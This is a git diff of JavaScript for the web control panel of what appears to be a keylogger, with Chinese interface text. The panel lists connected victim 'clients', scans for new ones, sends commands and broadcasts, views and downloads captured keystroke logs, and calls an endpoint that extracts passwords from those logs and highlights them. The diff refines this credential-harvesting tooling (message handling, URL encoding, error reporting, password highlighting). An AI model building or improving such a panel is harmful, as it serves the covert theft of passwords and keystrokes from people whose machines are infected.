@@ -202,22 +202,20 @@ function handleWebSocketMessage(data) {
             renderClientsTable();
             populateClientSelect();
             break;
-        case 'client_connected':
-        case 'client_offline':
+
         case 'client_updated':
             if (data.client) {
-                updateClientInList(data.client);
-            } else if (data.clientId) {
-                removeClientFromList(data.clientId);
+                if (data.event === 'deleted') {
+                    // 删除事件
+                    removeClientFromList(data.client.id);
+                } else {
+                    // 连接、离线、更新等事件
+                    updateClientInList(data.client);
+                }
             }
             populateClientSelect();
             break;
-        case 'client_deleted':
-            if (data.clientId) {
-                removeClientFromList(data.clientId);
-            }
-            populateClientSelect();
-            break;
+
         case 'client_response':
             console.log('客户端响应:', data);
             if (data.response && data.response.data) {
@@ -233,6 +231,7 @@ function handleWebSocketMessage(data) {
                 }
             }
             break;
+
         case 'command_result':
             console.log('命令结果:', data.result);
             if (data.result.success) {
@@ -241,23 +240,25 @@ function handleWebSocketMessage(data) {
                 showToast('命令发送失败: ' + data.result.error, 'error');
             }
             break;
+
         case 'broadcast_result':
             const successCount = data.results.filter(r => r.success).length;
             showToast(`广播完成: ${successCount}/${data.results.length} 成功`, 'success');
             break;
+
         case 'scan_complete':
             dom.scanProgress.classList.remove('show');
             showToast(`扫描完成，发现 ${data.found.length} 个客户端`, 'success');
             break;
+
         case 'scan_error':
             dom.scanProgress.classList.remove('show');
             showToast('扫描失败: ' + data.message, 'error');
             break;
-        
+
         case 'connect_result':
             if (data.client) {
-                // 清理超时定时器（如果存在）
-                if (window.connectTimeouts && window.connectTimeouts.has(data.client.id)) {
+                if (window.connectTimeouts?.has(data.client.id)) {
                     clearTimeout(window.connectTimeouts.get(data.client.id));
                     window.connectTimeouts.delete(data.client.id);
                 }
@@ -271,7 +272,7 @@ function handleWebSocketMessage(data) {
 
         case 'connect_error':
             if (data.clientId) {
-                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                if (window.connectTimeouts?.has(data.clientId)) {
                     clearTimeout(window.connectTimeouts.get(data.clientId));
                     window.connectTimeouts.delete(data.clientId);
                 }
@@ -280,6 +281,7 @@ function handleWebSocketMessage(data) {
             }
             showToast('连接失败: ' + (data.message || '未知错误'), 'error');
             break;
+
         case 'disconnect_result':
             if (data.success) {
                 showToast('客户端已断开', 'success');
@@ -287,6 +289,7 @@ function handleWebSocketMessage(data) {
                 showToast('断开失败: ' + (data.message || '未知错误'), 'error');
             }
             break;
+
         case 'delete_result':
             if (data.success) {
                 showToast('客户端已删除', 'success');
@@ -294,9 +297,11 @@ function handleWebSocketMessage(data) {
                 showToast('删除失败: ' + data.error, 'error');
             }
             break;
+
         case 'error':
             showToast('服务器错误: ' + data.message, 'error');
             break;
+
         default:
             console.log('未知消息类型:', data);
     }
@@ -756,7 +761,7 @@ function renderLogsTable(logs, clientId) {
 async function viewLog(clientId, filename, options = {}) {
      const { password = '', rawPassword = '' } = options;  // 解构参数
     try {
-        const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
+        const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/raw`);
         const content = await response.text();
 
         // 保存全局状态
@@ -913,14 +918,14 @@ async function fetchLogContent(clientId, filename) {
 
 // 下载日志
 function downloadLog(clientId, filename) {
-    window.open(`/api/clients/${clientId}/logs/${filename}/download`, '_blank');
+    window.open(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/download`, '_blank');
 }
 
 // 删除日志
 async function deleteLog(clientId, filename) {
     if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) return;
     try {
-        const response = await fetch(`/api/clients/${clientId}/logs/${filename}`, {
+        const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}`, {
             method: 'DELETE'
         });
         const result = await response.json();
@@ -1092,19 +1097,27 @@ async function extractPasswords() {
         const response = await fetch('/api/extract-passwords', {
             method: 'POST'
         });
-        const result = await response.json();
-        if (result.success) {
+
+        let result;
+        const text = await response.text();
+        try {
+            result = JSON.parse(text);
+        } catch (jsonError) {
+            throw new Error(`服务器返回非JSON响应: ${text}`);
+        }
+
+        if (response.ok && result.success) {
             showToast(`成功提取 ${result.count} 个密码`, 'success');
-            // 保存并直接展示
             lastExtractedPasswords = result.passwords;
             displayExtractedPasswords(result.passwords);
             document.getElementById('extractModal').classList.add('show');
         } else {
-            showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
+            const errorMessage = result?.error || result?.message || text || '未知错误';
+            showToast(`提取失败: ${errorMessage}`, 'error');
         }
     } catch (e) {
         console.error('提取密码失败:', e);
-        showToast('提取请求失败', 'error');
+        showToast('提取请求失败：' + (e.message || '未知错误'), 'error');
     }
 }
 
@@ -1181,30 +1194,61 @@ function parseExtractedPasswords(content) {
     return passwords;
 }
 
+//高亮显示
 function renderLogPage() {
     const logContentEl = document.getElementById('logContent');
     const pagerEl = document.getElementById('logPager');
     if (!currentLogContent) return;
 
-    // 1. 先进行全文高亮（在完整内容上匹配）
-    let highlightedFull = escapeHtml(currentLogContent);
+    let content = currentLogContent;
+
+    // 步骤 1：在原始文本中插入高亮占位符（使用安全文本占位符，避免控制字符问题）
+    const rawStart = '[[[KEYLOGGER_RAW_START]]]';
+    const rawEnd = '[[[KEYLOGGER_RAW_END]]]';
+    const pwdStart = '[[[KEYLOGGER_PWD_START]]]';
+    const pwdEnd = '[[[KEYLOGGER_PWD_END]]]';
+
+    // 处理原始密码高亮（优先）
+    let rawHighlighted = false;
     if (currentLogHighlightRaw) {
-        const escapedRaw = escapeHtml(currentLogHighlightRaw.replace(/\n/g, '↵'));
-        highlightedFull = highlightedFull.replace(
-            new RegExp(escapeRegexSpecialChars(escapedRaw), 'gi'),
-            '<span class="raw-password-highlight">$&</span>'
+        const replaced = content.replace(
+            new RegExp(escapeRegexSpecialChars(currentLogHighlightRaw), 'gi'),
+            (match) => {
+                rawHighlighted = true;
+                return `${rawStart}${match}${rawEnd}`;
+            }
         );
-    }
-    if (currentLogHighlightPassword && currentLogHighlightPassword !== currentLogHighlightRaw) {
-        const escapedPwd = escapeHtml(currentLogHighlightPassword);
-        highlightedFull = highlightedFull.replace(
-            new RegExp(escapeRegexSpecialChars(escapedPwd), 'gi'),
-            '<span class="password-highlight">$&</span>'
-        );
+        content = replaced;
     }
 
-    // 2. 按换行分页
-    const lines = highlightedFull.split('\n');
+    // 处理解析后密码高亮
+    let pwdHighlighted = false;
+    if (currentLogHighlightPassword) {
+        const shouldAttemptPassword = currentLogHighlightPassword !== currentLogHighlightRaw || !rawHighlighted;
+        if (shouldAttemptPassword) {
+            const replaced = content.replace(
+                new RegExp(escapeRegexSpecialChars(currentLogHighlightPassword), 'gi'),
+                (match) => {
+                    pwdHighlighted = true;
+                    return `${pwdStart}${match}${pwdEnd}`;
+                }
+            );
+            content = replaced;
+        }
+    }
+
+    // 步骤 2：对整个文本进行 HTML 转义
+    let html = escapeHtml(content);
+
+    // 步骤 3：将占位符替换为高亮 span
+    html = html
+        .replace(new RegExp(`${escapeRegexSpecialChars(rawStart)}(.*?)${escapeRegexSpecialChars(rawEnd)}`, 'gs'),
+            '<span class="raw-password-highlight">$1</span>')
+        .replace(new RegExp(`${escapeRegexSpecialChars(pwdStart)}(.*?)${escapeRegexSpecialChars(pwdEnd)}`, 'gs'),
+            '<span class="password-highlight">$1</span>');
+
+    // 步骤 4：分页处理
+    const lines = html.split('\n');
     const totalLines = lines.length;
     const maxPage = Math.ceil(totalLines / LOG_PAGE_SIZE) || 1;
     if (currentLogPage > maxPage) currentLogPage = maxPage;
@@ -1215,27 +1259,36 @@ function renderLogPage() {
     const pageLines = lines.slice(start, end);
     logContentEl.innerHTML = pageLines.join('\n');
 
-    // 3. 更新分页器（保持不变）
+    // 步骤 5：分页器渲染
     if (pagerEl) {
-        if (maxPage <= 1) pagerEl.innerHTML = '';
-        else pagerEl.innerHTML = `
-            <button class="btn btn-sm btn-secondary" ${currentLogPage===1?'disabled':''} onclick="changeLogPage(-1)"><i class="fas fa-chevron-left"></i> 上一页</button>
-            <span style="margin:0 1rem;color:var(--gray);">第 ${currentLogPage} 页 / ${maxPage} 页 (共 ${totalLines} 行)</span>
-            <button class="btn btn-sm btn-secondary" ${currentLogPage===maxPage?'disabled':''} onclick="changeLogPage(1)">下一页 <i class="fas fa-chevron-right"></i></button>
-        `;
+        if (maxPage <= 1) {
+            pagerEl.innerHTML = '';
+        } else {
+            pagerEl.innerHTML = `
+                <button class="btn btn-sm btn-secondary" ${currentLogPage === 1 ? 'disabled' : ''}
+                        onclick="changeLogPage(-1)">
+                    <i class="fas fa-chevron-left"></i> 上一页
+                </button>
+                <span style="margin:0 1rem;color:var(--gray);">第 ${currentLogPage} 页 / ${maxPage} 页 (共 ${totalLines} 行)</span>
+                <button class="btn btn-sm btn-secondary" ${currentLogPage === maxPage ? 'disabled' : ''}
+                        onclick="changeLogPage(1)">
+                    下一页 <i class="fas fa-chevron-right"></i>
+                </button>
+            `;
+        }
     }
 
-    // 4. 滚动到高亮位置（如果当前页有高亮）
+    // 步骤 6：自动滚动到高亮区域
     if (currentLogScrollTarget) {
         setTimeout(() => {
-            const highlight = document.querySelector('.raw-password-highlight') 
+            const highlight = document.querySelector('.raw-password-highlight')
                            || document.querySelector('.password-highlight');
             if (highlight) {
                 highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                // 闪烁效果
                 highlight.classList.add('blink');
                 setTimeout(() => highlight.classList.remove('blink'), 2000);
             } else {
-                // 如果当前页没有高亮（例如密码在未加载的页），滚动到页顶
                 logContentEl.scrollTop = 0;
             }
         }, 100);
@@ -1395,7 +1448,7 @@ function renderExtractedPage() {
                     <a href="javascript:void(0)" class="source-file-link"
                        data-client-id="${escapeHtml(clientId)}"
                        data-filename="${escapeHtml(filename)}"
-                       data-password="${escapeHtml(item.password || '')} "
+                       data-password="${escapeHtml(item.password || '')}"
                        data-raw-password="${escapeHtml(item.rawPassword || '')}"
                        style="color: var(--primary); text-decoration: underline; cursor: pointer;">
                         ${escapeHtml(item.file)}
